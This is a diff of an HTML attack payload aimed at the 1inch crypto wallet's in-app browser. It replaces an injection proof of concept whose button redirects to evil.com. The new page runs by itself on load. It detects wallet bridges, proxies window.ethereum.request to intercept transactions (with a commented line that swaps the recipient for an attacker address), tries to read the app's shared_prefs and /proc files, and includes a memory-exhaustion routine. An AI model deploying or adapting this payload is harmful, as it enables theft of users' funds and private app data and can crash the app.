@@ -1,12 +1,103 @@
-<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#000000;z-index:2147483647;color:#ffffff;display:flex;align-items:center;justify-content:center;flex-direction:column;font-size:28px;font-family:sans-serif;">
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>1inch Wallet WebView Test Payload</title>
+    <script>
+        console.log("[+] 1inch WebView Payload Loaded");
 
-  
-  <p style="margin-bottom:40px;color:#ffffff;font-size:24px;">HTML Injection Persistent on 1inch Wallet For iOS</p>
-  
-  <button onclick="window.location='https://evil.com'" 
-          style="padding:20px 50px;font-size:26px;background:#ffffff;color:#000000;
-                 border:4px solid #ffffff;border-radius:8px;cursor:pointer;font-weight:bold;">
-    CLICK HERE
-  </button>
-  
-</div>
+        // Probe common wallet bridges
+        function probeWallet() {
+            const candidates = [
+                'ethereum', 'web3', '1inch', 'wallet', 'provider', 
+                'signTransaction', 'sendTransaction', 'personal_sign'
+            ];
+            
+            candidates.forEach(key => {
+                if (window[key]) {
+                    console.log(`[!] Bridge detected: ${key}`);
+                    window.bridgeFound = key;
+                }
+            });
+
+            // Common Ethereum provider
+            if (window.ethereum) {
+                console.log("[!] Ethereum provider found - Ready for tx hijack");
+                window.ethereum.request = new Proxy(window.ethereum.request, {
+                    apply(target, thisArg, args) {
+                        console.log("[!] Intercepted request:", args);
+                        // Example tampering
+                        if (args[0].method === 'eth_sendTransaction') {
+                            console.log("[!] Transaction params modified by payload!");
+                            // args[0].params[0].to = "0xYourAttackerAddressHere"; // Uncomment jika mau test (HATI-HATI)
+                        }
+                        return target.apply(thisArg, args);
+                    }
+                });
+            }
+        }
+
+        // Test file access (sensitive data exfil)
+        function testFileAccess() {
+            const paths = [
+                "file:///data/data/io.oneinch.android/shared_prefs/*.xml",
+                "file:///proc/self/cmdline",
+                "content://com.android.chrome.FileProvider/"
+            ];
+            paths.forEach(path => {
+                fetch(path, {mode: 'no-cors'})
+                    .then(r => r.text())
+                    .then(data => console.log(`[+] File access success: ${path}`, data))
+                    .catch(e => console.log(`[-] Blocked: ${path}`));
+            });
+        }
+
+        // App disruption / heavy load
+        function disruptApp() {
+            console.log("[!] Starting resource exhaustion...");
+            let memoryHog = [];
+            for (let i = 0; i < 50000000; i++) {
+                memoryHog.push(new ArrayBuffer(1024));
+            }
+            console.log("[!] Memory pressure applied");
+        }
+
+        // Try to call native interfaces
+        function callNative() {
+            try {
+                if (window.Android || window.1inchInterface) {
+                    console.log("[!] Native interface found");
+                }
+            } catch(e) {}
+        }
+
+        // Auto-execute saat halaman load
+        window.onload = function() {
+            console.log("[+] Payload auto-started");
+            probeWallet();
+            testFileAccess();
+            callNative();
+            
+            // Uncomment salah satu jika ingin test lebih agresif
+            // disruptApp();
+            
+            setTimeout(() => {
+                console.log("[+] Payload finished execution");
+            }, 2000);
+        };
+
+        // Listen postMessage (common IPC)
+        window.addEventListener("message", (event) => {
+            console.log("[!] Received postMessage:", event.data);
+        });
+    </script>
+</head>
+<body>
+    <h1>1inch dApp Browser Test Payload</h1>
+    <p><strong>Auto executing probes...</strong></p>
+    <button onclick="probeWallet()">Probe Wallet Bridges</button>
+    <button onclick="testFileAccess()">Test File Access</button>
+    <button onclick="disruptApp()">Disrupt App (Memory)</button>
+</body>
+</html>
